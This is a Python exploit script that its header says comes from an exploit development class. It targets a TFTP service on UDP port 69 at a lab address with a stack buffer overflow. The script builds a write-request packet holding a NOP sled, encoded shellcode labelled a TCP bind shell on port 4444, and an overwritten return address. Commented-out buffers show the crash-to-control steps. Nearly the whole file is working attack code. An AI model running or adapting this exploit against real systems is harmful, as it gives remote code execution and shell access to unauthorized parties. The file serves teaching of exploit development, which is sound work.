#!/usr/bin/python
# Created during Georgia Weidman's Intro to Exploit Development class.
# Previous buffer values left in place as comments to show the progression from basic
# buffer overflow to remote code execution.

import sys
import socket

#buffer = "A" * 500
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"
# 473
#buffer = "A" * 473 + "B" * 4 + "C" * 23  # Clean overwrite

# 368 byte shellcode tcp bind 4444
shellcode = ("\xda\xdf\xba\x5d\xd0\xb4\xed\xd9\x74\x24\xf4\x58\x2b\xc9" +
"\xb1\x56\x31\x50\x18\x83\xe8\xfc\x03\x50\x49\x32\x41\x11" +
"\x99\x3b\xaa\xea\x59\x5c\x22\x0f\x68\x4e\x50\x5b\xd8\x5e" +
"\x12\x09\xd0\x15\x76\xba\x63\x5b\x5f\xcd\xc4\xd6\xb9\xe0" +
"\xd5\xd6\x05\xae\x15\x78\xfa\xad\x49\x5a\xc3\x7d\x9c\x9b" +
"\x04\x63\x6e\xc9\xdd\xef\xdc\xfe\x6a\xad\xdc\xff\xbc\xb9" +
"\x5c\x78\xb8\x7e\x28\x32\xc3\xae\x80\x49\x8b\x56\xab\x16" +
"\x2c\x66\x78\x45\x10\x21\xf5\xbe\xe2\xb0\xdf\x8e\x0b\x83" +
"\x1f\x5c\x32\x2b\x92\x9c\x72\x8c\x4c\xeb\x88\xee\xf1\xec" +
"\x4a\x8c\x2d\x78\x4f\x36\xa6\xda\xab\xc6\x6b\xbc\x38\xc4" +
"\xc0\xca\x67\xc9\xd7\x1f\x1c\xf5\x5c\x9e\xf3\x7f\x26\x85" +
"\xd7\x24\xfd\xa4\x4e\x81\x50\xd8\x91\x6d\x0d\x7c\xd9\x9c" +
"\x5a\x06\x80\xc8\xaf\x35\x3b\x09\xa7\x4e\x48\x3b\x68\xe5" +
"\xc6\x77\xe1\x23\x10\x77\xd8\x94\x8e\x86\xe2\xe4\x87\x4c" +
"\xb6\xb4\xbf\x65\xb6\x5e\x40\x89\x63\xf0\x10\x25\xdb\xb1" +
"\xc0\x85\x8b\x59\x0b\x0a\xf4\x7a\x34\xc0\x83\xbc\xfa\x30" +
"\xc0\x2a\xff\xc6\xf7\xf6\x76\x20\x9d\x16\xdf\xfa\x09\xd5" +
"\x04\x33\xae\x26\x6f\x6f\x67\xb1\x27\x79\xbf\xbe\xb7\xaf" +
"\xec\x13\x1f\x38\x66\x78\xa4\x59\x79\x55\x8c\x10\x42\x3e" +
"\x46\x4d\x01\xde\x57\x44\xf1\x43\xc5\x03\x01\x0d\xf6\x9b" +
"\x56\x5a\xc8\xd5\x32\x76\x73\x4c\x20\x8b\xe5\xb7\xe0\x50" +
"\xd6\x36\xe9\x15\x62\x1d\xf9\xe3\x6b\x19\xad\xbb\x3d\xf7" +
"\x1b\x7a\x94\xb9\xf5\xd4\x4b\x10\x91\xa1\xa7\xa3\xe7\xad" +
"\xed\x55\x07\x1f\x58\x20\x38\x90\x0c\xa4\x41\xcc\xac\x4b" +
"\x98\x54\xdc\x01\x80\xfd\x75\xcc\x51\xbc\x1b\xef\x8c\x83" +
"\x25\x6c\x24\x7c\xd2\x6c\x4d\x79\x9e\x2a\xbe\xf3\x8f\xde" +
"\xc0\xa0\xb0\xca")
ret = "\x4e\xae\x45\x7e"
buffer = "\x90" * 105 + shellcode  + ret + "C" * 23

packet = "\x00\x02" + "\x41" + "\x00" + buffer + "\x00"
s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.sendto(packet,('192.168.3.130',69))
response = s.recvfrom(2048)
print response

